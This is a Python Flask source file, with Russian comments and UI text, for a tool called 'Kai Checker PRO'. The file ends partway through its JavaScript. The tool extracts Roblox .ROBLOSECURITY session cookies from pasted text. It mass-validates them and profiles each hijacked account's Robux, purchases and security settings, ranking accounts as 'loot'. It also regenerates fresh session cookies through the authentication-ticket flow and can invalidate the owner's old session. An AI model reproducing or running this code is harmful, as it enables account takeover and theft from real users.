import os
import time
import logging
import re
import urllib3
import json
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory

# ==========================================
# ИНИЦИАЛИЗАЦИЯ И НАСТРОЙКИ
# ==========================================
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
os.makedirs("history", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CHECKER_HISTORY_FILE = "history/checker_history.json"
FRESHER_HISTORY_FILE = "history/fresher_history.json"

# ==========================================
# БЛОК: ИСТОРИЯ
# ==========================================
def load_history(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp, 'r', encoding='utf-8') as f: return json.load(f)
    except: return []

def save_history(fp, data):
    try:
        with open(fp, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=2)
    except: pass

def add_checker_history(entry):
    h = load_history(CHECKER_HISTORY_FILE)
    h.append({
        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        'type': entry.get('type','single'),
        'total': entry.get('total',1),
        'valid': entry.get('valid',0),
        'results': entry.get('results', [])
    })
    if len(h) > 50: h = h[-50:]
    save_history(CHECKER_HISTORY_FILE, h)

def add_fresher_history(entry):
    h = load_history(FRESHER_HISTORY_FILE)
    h.append({
        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        'mode': entry.get('mode','duplicate'),
        'refreshed_count': entry.get('refreshed_count',0),
        'cookies': entry.get('cookies', [])
    })
    if len(h) > 50: h = h[-50:]
    save_history(FRESHER_HISTORY_FILE, h)

# ==========================================
# БЛОК: ЧЕКЕР
# ==========================================
def extract_cookies_from_text(text):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='): cookie = cookie[15:]
        if len(cookie) > 50: cookies.append(cookie)
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies: cookies.append(cookie)
    seen = set()
    unique = []
    for c in cookies:
        if c not in seen: seen.add(c); unique.append(c)
    return unique

def get_full_info(cookie):
    info = {'status':'❌','Username':'?','UserID':'?','Robux':0,'Created':'?','Country':'?','EmailSet':False,'TwoFactorEnabled':False,'AccountPinEnabled':False,'PhoneSet':False,'SecurityStatus':'⚠️ НИЗКИЙ','Cookie':cookie,'PurchasedGamepasses':{},'CreditCardsCount':0,'IsPremium':False,'DonationTotal':0}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code != 200: return info
        d = r.json()
        if 'id' not in d: return info
        info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
        uid = info['UserID']
        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except: return {}
        sd = g('https://www.roblox.com/my/settings/json')
        if sd:
            sec = sd.get('MyAccountSecurityModel',{})
            info['EmailSet'] = sec.get('IsEmailSet',False); info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False); info['PhoneSet'] = sec.get('IsPhoneSet',False)
        pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if pm and pm.get('isSubscribed'): info['IsPremium'] = True
        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except: pass
        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb: info['Robux'] = rb.get('robux',0)
        ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if ct: info['Country'] = ct.get('countryCode','?')
        try:
            total = 0; gp_dict = {}; cursor = ""; page = 0
            while page < 5:
                url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
                if cursor: url += f"&cursor={cursor}"
                r = s.get(url, verify=False, timeout=10)
                if r.status_code != 200: break
                data = r.json()
                for item in data.get('data',[]):
                    price = abs(item.get('currency',{}).get('amount',0)); total += price
                    if price >= 50:
                        nm = item.get('details',{}).get('name','Товар')
                        pn = item.get('details',{}).get('place',{}).get('name','Другие игры')
                        if pn not in gp_dict: gp_dict[pn] = []
                        gp_dict[pn].append({'name':nm,'price':price})
                cursor = data.get('nextPageCursor')
                if not cursor: break
                page += 1; time.sleep(0.1)
            info['PurchasedGamepasses'] = gp_dict; info['DonationTotal'] = total
        except: pass
        sc = 0
        if info['EmailSet']: sc += 1
        if info['TwoFactorEnabled']: sc += 2
        if info['AccountPinEnabled']: sc += 1
        if info['PhoneSet']: sc += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')
    except: pass
    return info

def quick_validate(cookie):
    result = {'status':'❌','username':'?','user_id':'?','robux':0,'created':'?','created_ts':0,'is_premium':False,'has_email':False,'has_2fa':False,'cookie':cookie,'score':0}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        r = s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY':c}, timeout=10, verify=False)
        if r.status_code == 200:
            d = r.json()
            if 'id' in d:
                result['status'] = '✅'; result['username'] = d.get('name','?'); result['user_id'] = d.get('id','?')
                uid = result['user_id']
                try:
                    rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if rb.status_code == 200: result['robux'] = rb.json().get('robux',0)
                except: pass
                try:
                    rd = s.get(f'https://users.roblox.com/v1/users/{uid}', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if rd.status_code == 200:
                        cr = rd.json().get('created','')
                        if cr:
                            result['created'] = datetime.fromisoformat(cr.replace('Z','+00:00')).strftime('%d.%m.%Y')
                            result['created_ts'] = datetime.fromisoformat(cr.replace('Z','+00:00')).timestamp()
                except: pass
                try:
                    pm = s.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if pm.status_code == 200: result['is_premium'] = pm.json().get('isSubscribed',False)
                except: pass
                try:
                    st = s.get('https://www.roblox.com/my/settings/json', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if st.status_code == 200:
                        sec = st.json().get('MyAccountSecurityModel',{})
                        result['has_email'] = sec.get('IsEmailSet',False); result['has_2fa'] = sec.get('IsTwoStepEnabled',False)
                except: pass
                score = 0
                if result['robux'] >= 10000: score += 100
                elif result['robux'] >= 1000: score += 50
                elif result['robux'] >= 100: score += 25
                elif result['robux'] > 0: score += 10
                if result['is_premium']: score += 50
                if result['has_email']: score += 15
                if result['has_2fa']: score += 10
                if result['created_ts'] > 0:
                    age = (datetime.now().timestamp() - result['created_ts']) / 86400
                    if age > 365*3: score += 30
                    elif age > 365: score += 20
                result['score'] = score
    except: pass
    return result

def mass_check(cookies_list):
    results = []
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
        for f in as_completed(futures):
            try: results.append(f.result())
            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
    valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
    valid.sort(key=lambda x: x['score'], reverse=True)
    return valid + invalid

def format_full_report(info):
    if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
    gp = info.get('PurchasedGamepasses',{})
    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
    r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
    if gp:
        r += "📦 ГЕЙМПАССЫ:\n"
        for game, passes in list(gp.items())[:3]:
            for p in passes[:5]: r += f"  {game} - {p['name']} ({p['price']} R$)\n"
    r += f"\n🍪 {info['Cookie']}"
    return r

def format_quick_report(result):
    if result['status'] == '✅':
        score = result.get('score',0)
        rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else ("🟢" if score>=30 else "🔹")))
        badges = []
        if result.get('is_premium'): badges.append("💠")
        if result.get('has_2fa'): badges.append("🔐")
        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} | {result['created']} | S:{score} {' '.join(badges)}\n🍪 {result['cookie']}"
    return f"❌ НЕВАЛИД | {result['cookie']}"

# ==========================================
# БЛОК: ФРЕШЕР
# ==========================================
def refresh_roblox_cookie(cookie, kill_old=False):
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        cookies_dict = {'.ROBLOSECURITY': c}
        check_s = requests.Session()
        check_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        check_r = check_s.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, timeout=10, verify=False)
        if check_r.status_code != 200:
            result['error'] = "Кука невалидна"; return result
        user_data = check_r.json()
        result['username'] = user_data.get('name', '?'); result['user_id'] = user_data.get('id', '?')
        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, verify=False, timeout=10)
        csrf_token = csrf_r.headers.get('x-csrf-token')
        if not csrf_token:
            result['error'] = "CSRF token not found"; return result
        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'referer': 'https://www.roblox.com/hewhewhew', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, verify=False, timeout=15)
        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
        if not auth_ticket:
            result['error'] = "Auth ticket not found"; return result
        redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, verify=False, timeout=15)
        new_cookie_value = None
        set_cookie = redeem_r.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
            if match: new_cookie_value = match.group(1)
        if not new_cookie_value:
            for co in redeem_r.cookies:
                if co.name == '.ROBLOSECURITY' and co.value: new_cookie_value = co.value; break
        if not new_cookie_value:
            result['error'] = "New cookie not found"; return result
        if kill_old:
            try:
                break_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
                requests.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict, verify=False, timeout=10)
            except: pass
        test_s = requests.Session()
        test_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie_value}, verify=False, timeout=10)
        if test_r.status_code == 200 and 'id' in test_r.json():
            result['new_cookie'] = new_cookie_value; result['success'] = True
        else:
            result['error'] = "New cookie validation failed"
    except Exception as e:
        result['error'] = str(e)
    return result

# ==========================================
# БЛОК: ИНСТРУМЕНТЫ
# ==========================================
def merge_cookie_files(contents):
    all_cookies = set()
    for c in contents:
        for l in c.split('\n'):
            l = l.strip()
            if len(l)>20: all_cookies.add(l)
    return '\n'.join(sorted(all_cookies))

def remove_duplicates(content):
    cookies = [l.strip() for l in content.split('\n') if len(l)>20]
    return '\n'.join(list(dict.fromkeys(cookies)))

# ==========================================
# БЛОК: ИНТЕРФЕЙС (HTML/CSS/JS)
# ==========================================
app = Flask(__name__)

HTML = r"""<!DOCTYPE html>
<html lang="ru" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #07030d;
            --bg-card: rgba(23, 10, 38, 0.55);
            --border-card: rgba(168, 85, 247, 0.25);
            --border-hover: rgba(217, 70, 239, 0.6);
            --input-bg: rgba(12, 5, 20, 0.75);
            --text-main: #f3e8ff;
            --text-muted: #a78bfa;
            --accent-purple: #a855f7;
            --accent-pink: #d946ef;
            --accent-glow: rgba(168, 85, 247, 0.4);
            --gradient-primary: linear-gradient(135deg, #a855f7 0%, #d946ef 50%, #6366f1 100%);
            --gradient-btn: linear-gradient(135deg, #9333ea 0%, #c026d3 100%);
            --gradient-btn-hover: linear-gradient(135deg, #a855f7 0%, #e879f9 100%);
        }
        [data-theme="light"] {
            --bg: #f5f0ff;
            --bg-card: rgba(255, 255, 255, 0.75);
            --border-card: rgba(168, 85, 247, 0.2);
            --border-hover: rgba(168, 85, 247, 0.5);
            --input-bg: rgba(243, 232, 255, 0.6);
            --text-main: #2e1065;
            --text-muted: #7e22ce;
            --accent-purple: #7e22ce;
            --accent-pink: #c026d3;
            --accent-glow: rgba(126, 34, 206, 0.2);
            --gradient-primary: linear-gradient(135deg, #7e22ce 0%, #c026d3 100%);
            --gradient-btn: linear-gradient(135deg, #7e22ce 0%, #a855f7 100%);
            --gradient-btn-hover: linear-gradient(135deg, #6b21a8 0%, #9333ea 100%);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            min-height: 100vh;
            background: var(--bg);
            color: var(--text-main);
            position: relative;
            overflow-x: hidden;
            padding: 24px 16px;
        }

        #particles-canvas {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            z-index: 0;
            pointer-events: none;
        }
        .bg-glow {
            position: fixed;
            width: 500px; height: 500px;
            background: radial-gradient(circle, rgba(168, 85, 247, 0.18) 0%, rgba(0,0,0,0) 70%);
            top: -100px; left: 50%;
            transform: translateX(-50%);
            z-index: 0;
            pointer-events: none;
            animation: pulseGlow 8s infinite alternate ease-in-out;
        }
        @keyframes pulseGlow {
            0% { transform: translateX(-50%) scale(1); opacity: 0.7; }
            100% { transform: translateX(-50%) scale(1.3); opacity: 1; }
        }

        .wrapper {
            max-width: 1350px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
            background: var(--bg-card);
            border: 1px solid var(--border-card);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 28px;
            padding: 32px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 24px;
            border-bottom: 1px solid var(--border-card);
            margin-bottom: 28px;
            flex-wrap: wrap;
            gap: 16px;
        }
        .logo-wrap { display: flex; align-items: center; gap: 12px; }
        .logo-text {
            font-size: 28px; font-weight: 800; letter-spacing: -0.5px;
            background: var(--gradient-primary);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px var(--accent-glow);
        }
        .badge-pro {
            font-size: 11px; font-weight: 800;
            background: rgba(168, 85, 247, 0.15);
            color: var(--accent-pink);
            padding: 4px 12px; border-radius: 20px;
            border: 1px solid var(--border-card);
            letter-spacing: 1.5px;
        }

        .stats-bar { display: flex; gap: 12px; flex-wrap: wrap; }
        .stat-card {
            background: var(--input-bg);
            border: 1px solid var(--border-card);
            padding: 8px 16px; border-radius: 16px;
            display: flex; flex-direction: column; align-items: center; min-width: 90px;
        }
        .stat-val { font-size: 16px; font-weight: 800; color: var(--accent-pink); text-shadow: 0 0 10px var(--accent-glow); }
        .stat-lbl { font-size: 10px; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }

        .tabs {
            display: flex; gap: 12px; margin-bottom: 32px;
            background: var(--input-bg);
            padding: 8px; border-radius: 22px;
            border: 1px solid var(--border-card);
            width: fit-content; flex-wrap: wrap;
            box-shadow: 0 8px 30px rgba(0,0,0,0.25);
        }
        .tab {
            padding: 14px 32px; border-radius: 16px;
            color: var(--text-muted); cursor: pointer;
            font-size: 15px; font-weight: 700;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            border: 1px solid transparent; background: transparent;
            display: flex; align-items: center; gap: 8px;
        }
        .tab:hover {
            color: var(--text-main);
            background: rgba(168, 85, 247, 0.1);
            border-color: rgba(168, 85, 247, 0.2);
            transform: translateY(-1px);
        }
        .tab.active {
            background: var(--gradient-btn);
            color: #fff;
            border-color: rgba(255, 255, 255, 0.2);
            box-shadow: 0 6px 25px var(--accent-glow), 0 0 15px rgba(217, 70, 239, 0.4);
            transform: translateY(-1px);
        }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        .card {
            background: var(--bg-card);
            border: 1px solid var(--border-card);
            border-radius: 20px; padding: 24px;
            margin-bottom: 20px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        .card:hover {
            border-color: var(--border-hover);
            box-shadow: 0 10px 30px var(--accent-glow);
        }
        .card h2, .card h3 {
            font-size: 16px; font-weight: 800; margin-bottom: 16px;
            color: var(--text-main); display: flex; align-items: center; gap: 8px;
        }

        .btn {
            position: relative; overflow: hidden;
            padding: 12px 24px; border: none; border-radius: 14px;
            font-size: 13px; font-weight: 700; cursor: pointer;
            color: #fff; display: inline-flex; align-items: center;
            justify-content: center; gap: 8px; text-decoration: none;
            transition: all 0.25s; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .btn-primary { background: var(--gradient-btn); }
        .btn-primary:hover { background: var(--gradient-btn-hover); box-shadow: 0 6px 25px var(--accent-glow); transform: translateY(-1px); }
        .btn-secondary { background: var(--input-bg); border: 1px solid var(--border-card); color: var(--text-muted); }
        .btn-secondary:hover { color: var(--text-main); border-color: var(--accent-purple); }
        .btn-danger { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; }
        .btn-danger:hover { background: rgba(239, 68, 68, 0.3); }
        .btn-sm { padding: 8px 16px; font-size: 12px; border-radius: 10px; }

        /* Стиль подсвеченной активной кнопки фрешера */
        .fresher-mode-btn.active-mode {
            background: var(--gradient-btn) !important;
            color: #fff !important;
            border-color: var(--accent-pink) !important;
            box-shadow: 0 0 20px var(--accent-glow), 0 0 10px var(--accent-pink);
            transform: scale(1.03);
        }

        .ripple {
            position: absolute; border-radius: 50%;
            transform: scale(0); animation: ripple-anim 0.6s linear;
            background: rgba(255, 255, 255, 0.4); pointer-events: none;
        }
        @keyframes ripple-anim {
            to { transform: scale(4); opacity: 0; }
        }

        textarea, input[type="number"], input[type="text"] {
            width: 100%; padding: 14px;
            background: var(--input-bg);
            border: 1px solid var(--border-card);
            border-radius: 14px; color: var(--text-main);
            font-family: monospace; font-size: 12px;
            transition: border-color 0.2s;
        }
        textarea:focus, input:focus { border-color: var(--accent-pink); box-shadow: 0 0 10px var(--accent-glow); }

        .upload-area {
            min-height: 110px; border: 2px dashed var(--border-card);
            border-radius: 16px; background: var(--input-bg);
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; cursor: pointer; transition: all 0.25s; text-align: center;
        }
        .upload-area:hover, .upload-area.drag-over {
            border-color: var(--accent-pink); background: rgba(168, 85, 247, 0.08);
            box-shadow: 0 0 15px var(--accent-glow);
        }

        .result-container {
            margin-top: 16px;
            position: relative;
        }
        .result-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 6px;
        }
        .result-title {
            font-size: 12px;
            font-weight: 700;
            color: var(--text-muted);
        }
        .btn-close-box {
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #fca5a5;
            padding: 3px 10px;
            border-radius: 8px;
            font-size: 11px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-close-box:hover {
            background: rgba(239, 68, 68, 0.3);
        }

        .result-box {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 14px; padding: 14px;
            max-height: 400px; overflow-y: auto; font-family: monospace;
            font-size: 12px; color: var(--text-main); white-space: pre-wrap; word-break: break-all;
        }

        .progress-bar {
            margin-top: 12px; background: var(--input-bg);
            border-radius: 20px; height: 8px; overflow: hidden; border: 1px solid var(--border-card);
        }
        .progress-fill { height: 100%; width: 0%; background: var(--gradient-btn); transition: width 0.3s ease; }

        .checker-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media(max-width:900px){ .checker-grid { grid-template-columns: 1fr; } }

        .theme-btn {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 30px; padding: 8px 16px; cursor: pointer;
            font-size: 12px; color: var(--text-main); font-weight: 700; transition: all 0.2s;
        }
        .theme-btn:hover { border-color: var(--accent-purple); }

        .footer {
            text-align: center; padding-top: 20px; color: var(--text-muted);
            font-size: 12px; font-weight: 600; border-top: 1px solid var(--border-card); margin-top: 24px;
        }
        
        .history-card {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 16px; padding: 16px; margin-bottom: 14px;
        }
        .history-header {
            display: flex; justify-content: space-between; align-items: center;
            font-size: 13px; font-weight: 700; margin-bottom: 10px; color: var(--accent-pink);
        }
        
        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; }
    </style>
</head>
<body>
<canvas id="particles-canvas"></canvas>
<div class="bg-glow"></div>

<div class="wrapper">
    <!-- Шапка -->
    <div class="header">
        <div class="logo-wrap">
            <div class="logo-text">KAI CHECKER</div>
            <span class="badge-pro">PRO EDITION</span>
        </div>
        <div class="stats-bar">
            <div class="stat-card"><span class="stat-val" id="statValid">0</span><span class="stat-lbl">Валид</span></div>
            <div class="stat-card"><span class="stat-val" id="statRobux">0</span><span class="stat-lbl">Robux</span></div>
            <div class="stat-card"><span class="stat-val" id="statPremium">0</span><span class="stat-lbl">Premium</span></div>
        </div>
        <button class="theme-btn" onclick="toggleTheme()">🌓 Тема</button>
    </div>

    <!-- Вкладки -->
    <div class="tabs">
        <button class="tab active" data-tab="checker">🔍 Чекер</button>
        <button class="tab" data-tab="fresher">🔄 Фрешер</button>
        <button class="tab" data-tab="history">📋 История</button>
        <button class="tab" data-tab="tools">🧰 Инструменты</button>
    </div>

    <!-- ЧЕКЕР -->
    <div class="tab-content active" id="tab-checker">
        <div class="checker-grid">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <textarea id="singleCookie" placeholder="Вставьте ОДИН .ROBLOSECURITY кук..." rows="5"></textarea>
                <div style="margin-top:12px;">
                    <button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">Проверить кук</button>
                </div>
                <div class="result-container" id="singleContainer" style="display:none;">
                    <div class="result-header">
                        <span class="result-title">РЕЗУЛЬТАТ:</span>
                        <button class="btn-close-box" onclick="closeBox('singleContainer')">✖ Свернуть</button>
                    </div>
                    <div class="result-box" id="singleResult"></div>
                </div>
            </div>
            <div class="card">
                <h2>📦 Массовая проверка (30 Потоков)</h2>
                <div class="upload-area" id="massDropArea" onclick="document.getElementById('massFile').click()">
                    <p style="font-weight:700;">📁 Перетащите TXT файл с куками</p>
                    <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или нажмите для выбора</p>
                </div>
                <input type="file" id="massFile" accept=".txt" style="display:none;">
                <div id="massFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>
                <div style="margin-top:12px;">
                    <button class="btn btn-primary" onclick="runMassCheck()" style="width:100%;">🚀 Запустить массовый чек</button>
                </div>
                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
                
                <div class="result-container" id="massContainer" style="display:none;">
                    <div class="result-header">
                        <span class="result-title">РЕЗУЛЬТАТЫ ЧЕКА:</span>
                        <button class="btn-close-box" onclick="closeBox('massContainer')">✖ Свернуть</button>
                    </div>
                    <div class="result-box" id="massResult"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- ФРЕШЕР -->
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Обновление сессий (20 Потоков)</h2>
            <div style="display:flex;gap:12px;margin-bottom:14px;align-items:center;">
                <span style="font-size:13px;font-weight:700;color:var(--text-muted);">Режим работы:</span>
                <button class="btn btn-secondary btn-sm fresher-mode-btn active-mode" id="btnDup" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
                <button class="btn btn-secondary btn-sm fresher-mode-btn" id="btnKill" onclick="setFresherMode('kill')">💀 Инвалидировать старую</button>
            </div>
            <input type="hidden" id="fresherMode" value="duplicate">
            <textarea id="fresherCookies" placeholder="Вставьте куки списком..." rows="6"></textarea>
            <div style="margin-top:12px;display:flex;gap:10px;">
                <button class="btn btn-primary" onclick="runFresher()">⚡ Обновить куки</button>
            </div>
            
            <div class="result-container" id="fresherContainer" style="display:none;">
                <div class="result-header">
                    <span class="result-title">ОБНОВЛЕННЫЕ КУКИ:</span>
                    <button class="btn-close-box" onclick="closeBox('fresherContainer')">✖ Свернуть</button>
                </div>
                <div class="result-box" id="fresherResult"></div>
            </div>
        </div>
    </div>

    <!-- ИСТОРИЯ -->
    <div class="tab-content" id="tab-history">
        <div class="card">
            <h2>📋 История Чекера (Лут и Отчеты) <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2>
            <div id="checkerHistoryList">Загрузка истории...</div>
        </div>
        <div class="card">
            <h2>🔄 История Фрешера (Новые Куки) <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2>
            <div id="fresherHistoryList">Загрузка истории...</div>
        </div>
    </div>

    <!-- ИНСТРУМЕНТЫ -->
    <div class="tab-content" id="tab-tools">
        <div class="tool-grid">
            <div class="card">
                <h3>🔗 Слияние TXT</h3>
                <input type="file" id="mergeFiles" accept=".txt" multiple style="margin-top:8px;">
                <button class="btn btn-primary btn-sm" onclick="mergeCookies()" style="margin-top:10px;width:100%;">Объединить</button>
                <div class="result-box" id="mergeResult" style="max-height:80px;margin-top:10px;"></div>
            </div>
            <div class="card">
                <h3>✂️ Очистка от дубликатов</h3>
                <textarea id="cleanInput" placeholder="Куки..." rows="3"></textarea>
                <button class="btn btn-primary btn-sm" onclick="cleanCookies()" style="margin-top:10px;width:100%;">Удалить дубли</button>
                <div class="result-box" id="cleanResult" style="max-height:80px;margin-top:10px;"></div>
            </div>
        </div>
    </div>

    <!-- Подвал -->
    <div class="footer">KAI CHECKER © ALL RIGHTS RESERVED</div>
</div>

<script>
// --- АНИМАЦИЯ ЧАСТИЦ ФОНА ---
const canvas = document.getElementById('particles-canvas');
const ctx = canvas.getContext('2d');
let particles = [];

function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

for(let i=0; i<40; i++) {
    particles.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        r: Math.random() * 2 + 1,
        dx: (Math.random() - 0.5) * 0.5,
        dy: (Math.random() - 0.5) * 0.5,
        alpha: Math.random() * 0.5 + 0.2
    });
}

function animateParticles() {
    ctx.clearRect(0,0,canvas.width,canvas.height);
    particles.forEach(p => {
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
        ctx.fillStyle = `rgba(217, 70, 239, ${p.alpha})`;
        ctx.shadowBlur = 10; ctx.shadowColor = '#a855f7';
        ctx.fill();
        p.x += p.dx; p.y += p.dy;
        if(p.x<0 || p.x>canvas.width) p.dx *= -1;
        if(p.y<0 || p.y>canvas.height) p.dy *= -1;
    });
    requestAnimationFrame(animateParticles);
}
animateParticles();

// --- RIPPLE ЭФФЕКТ ---
document.addEventListener('click', function(e) {
    if (e.target.classList.contains('btn')) {
        const btn = e.target;
        const circle = document.createElement('span');
        const diameter = Math.max(btn.clientWidth, btn.clientHeight);
        const radius = diameter / 2;
        circle.style.width = circle.style.height = `${diameter}px`;
        circle.style.left = `${e.clientX - btn.getBoundingClientRect().left - radius}px`;
        circle.style.top = `${e.clientY - btn.getBoundingClientRect().top - radius}px`;
        circle.classList.add('ripple');
        const ripple = btn.getElementsByClassName('ripple')[0];
        if (ripple) ripple.remove();
        btn.appendChild(circle);
    }
});

